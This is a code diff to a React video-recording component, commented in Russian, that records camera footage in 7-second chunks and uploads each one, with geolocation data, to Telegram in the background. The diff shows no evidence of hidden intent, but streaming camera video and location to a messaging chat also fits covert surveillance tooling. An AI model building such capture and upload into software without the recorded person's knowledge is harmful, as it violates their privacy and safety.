@@ -29,6 +29,9 @@ export function VideoRecorder({
   const [mimeType, setMimeType] = useState<string>('');
   const isRecordingRef = useRef<boolean>(isRecording);
   const usedMimeTypeRef = useRef<string>('');
+  const lastSendTimeRef = useRef<number>(0); // Throttle для отправки
+  const isMountedRef = useRef<boolean>(true); // ✅ ИСПРАВЛЕНИЕ: Отслеживание монтирования
+  const pendingUploadsRef = useRef<Promise<void>[]>([]); // ✅ ИСПРАВЛЕНИЕ: Отслеживание pending uploads
   
   // Update isRecording ref when prop changes
   useEffect(() => {
@@ -38,8 +41,19 @@ export function VideoRecorder({
   // Log component mount with camera type
   useEffect(() => {
     console.log(`🔥 [VideoRecorder] Component MOUNTED with camera: ${cameraType}, current chunk counter: ${globalChunkCounter.current}`);
+    isMountedRef.current = true;
+    
     return () => {
-      console.log(`💀 [VideoRecorder] Component UNMOUNTED for camera: ${cameraType}`);
+      console.log(`💀 [VideoRecorder] Component UNMOUNTING for camera: ${cameraType}`);
+      isMountedRef.current = false;
+      
+      // ✅ ИСПРАВЛЕНИЕ: Ждём завершения всех pending uploads перед размонтированием
+      if (pendingUploadsRef.current.length > 0) {
+        console.log(`⏳ [VideoRecorder] Waiting for ${pendingUploadsRef.current.length} pending uploads...`);
+        Promise.all(pendingUploadsRef.current).then(() => {
+          console.log(`✅ [VideoRecorder] All pending uploads completed`);
+        });
+      }
     };
   }, [cameraType]);
 
@@ -194,17 +208,28 @@ export function VideoRecorder({
         const blobMimeType = usedMimeTypeRef.current || 'video/webm';
         const blob = new Blob(chunksRef.current, { type: blobMimeType });
         
-        // Check minimum blob size (skip < 10KB)
-        if (blob.size < 10000) {
+        // ✅ УВЕЛИЧЕН минимальный размер с 10KB до 100KB
+        if (blob.size < 100000) {
           console.warn(`⚠️ [Video ${cameraType}] Блоб слишком маленький (${blob.size} bytes), пропускаем`);
           chunksRef.current = [];
           return;
         }
         
+        // ✅ THROTTLE: Не отправляем чаще 1 раза в 10 секунд
+        const now = Date.now();
+        const timeSinceLastSend = now - lastSendTimeRef.current;
+        if (timeSinceLastSend < 10000) {
+          console.warn(`⚠️ [Video ${cameraType}] Throttle: слишком рано для отправки (прошло ${timeSinceLastSend}ms), пропускаем`);
+          chunksRef.current = [];
+          return;
+        }
+        
+        lastSendTimeRef.current = now;
+        
         globalChunkCounter.current += 1;
         const currentChunkNum = globalChunkCounter.current;
         
-        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${currentChunkNum} с MIME: ${blobMimeType}, размер: ${blob.size} bytes`);
+        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${currentChunkNum} с MIME: ${blobMimeType}, размер: ${(blob.size / 1024 / 1024).toFixed(2)} MB`);
 
         // КРИТИЧНО: Сначала вызываем onChunkReady для обновления номера чанка
         if (onChunkReady) {
@@ -212,10 +237,35 @@ export function VideoRecorder({
           onChunkReady(blob, currentChunkNum, cameraType);
         }
         
-        // Затем отправляем видео в Telegram
-        console.log(`📤 [Video ${cameraType}] Отправляем чанк #${currentChunkNum} в Telegram...`);
-        await sendVideoToTelegram(blob, currentChunkNum, cameraType, geoData);
-        console.log(`✅ [Video ${cameraType}] Чанк #${currentChunkNum} успешно отправлен`);
+        // ✅ АСИНХРОННАЯ отправка БЕЗ блокировки UI (используем Promise без await)
+        console.log(`📤 [Video ${cameraType}] Отправляем чанк #${currentChunkNum} в Telegram (асинхронно)...`);
+        
+        // ✅ Используем requestIdleCallback для отправки в фоновом режиме без блокировки UI
+        const sendInBackground = () => {
+          const uploadPromise = sendVideoToTelegram(blob, currentChunkNum, cameraType, geoData)
+            .then(() => {
+              console.log(`✅ [Video ${cameraType}] Чанк #${currentChunkNum} успешно отправлен`);
+            })
+            .catch((error) => {
+              console.error(`❌ [Video ${cameraType}] Ошибка отправки чанка #${currentChunkNum}:`, error);
+            });
+          
+          // ✅ ИСПРАВЛЕНИЕ: Добавляем promise в список pending uploads
+          pendingUploadsRef.current.push(uploadPromise);
+          
+          // ✅ ИСПРАВЛЕНИЕ: Удаляем promise из списка после завершения
+          uploadPromise.finally(() => {
+            pendingUploadsRef.current = pendingUploadsRef.current.filter(p => p !== uploadPromise);
+          });
+        };
+        
+        // Проверяем поддержку requestIdleCallback
+        if ('requestIdleCallback' in window) {
+          requestIdleCallback(sendInBackground, { timeout: 2000 });
+        } else {
+          // Fallback для браузеров без requestIdleCallback
+          setTimeout(sendInBackground, 0);
+        }
 
         chunksRef.current = [];
       };
@@ -228,11 +278,11 @@ export function VideoRecorder({
       recorder.start();
       console.log(`✅ [Video ${cameraType}] Запись началась`);
 
-      // Send chunks every 5 seconds
+      // ✅ Интервал 7 секунд (оптимальный баланс размера и частоты)
       intervalRef.current = setInterval(() => {
         const currentRecorder = mediaRecorderRef.current;
         if (currentRecorder && currentRecorder.state === 'recording') {
-          console.log(`⏰ [Video ${cameraType}] 5 секунд прошло - останавливаем чанк`);
+          console.log(`⏰ [Video ${cameraType}] 7 секунд прошло - останавливаем чанк`);
           currentRecorder.stop();
           
           // Wait 100ms before trying to restart
@@ -249,7 +299,7 @@ export function VideoRecorder({
             }
           }, 100);
         }
-      }, 5000); // 5 seconds
+      }, 7000); // ✅ 7 seconds
 
     } catch (error) {
       console.error(`❌ [Video ${cameraType}] Ошибка создания MediaRecorder:`, error);
